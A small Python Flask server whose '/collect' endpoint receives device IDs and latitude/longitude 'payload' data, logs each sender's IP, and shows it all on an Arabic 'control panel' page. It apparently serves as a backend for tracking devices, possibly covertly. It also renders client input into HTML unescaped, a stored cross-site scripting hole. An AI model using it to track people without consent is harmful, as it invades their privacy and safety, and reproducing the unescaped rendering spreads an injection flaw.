from flask import Flask, request, jsonify

app = Flask(__name__)

devices = {}

@app.route('/')
def home():
    html = '<html dir="rtl"><head><meta charset="UTF-8"><title>لوحة التحكم</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px}h1{border-bottom:2px solid #0f0}</style></head><body><h1>📱 لوحة التحكم</h1><button onclick="location.reload()" style="background:#0f0;color:#000;padding:10px;border:none;border-radius:5px;font-weight:bold;cursor:pointer">🔄 تحديث</button><hr>'
    for id, d in devices.items():
        html += f'<p>📱 {id[:10]} | 🌐 {d.get("ip","?")} | 📍 {d.get("lat","?")},{d.get("lon","?")} | ⏰ {d.get("last","?")}</p>'
    html += '</body></html>'
    return html

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    id = data.get('id', '?')
    devices[id] = {
        'ip': request.remote_addr,
        'lat': data.get('payload', {}).get('lat', '?'),
        'lon': data.get('payload', {}).get('lon', '?'),
        'last': __import__('time').strftime('%H:%M:%S')
    }
    return jsonify({'ok': True})

if __name__ == '__main__':
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
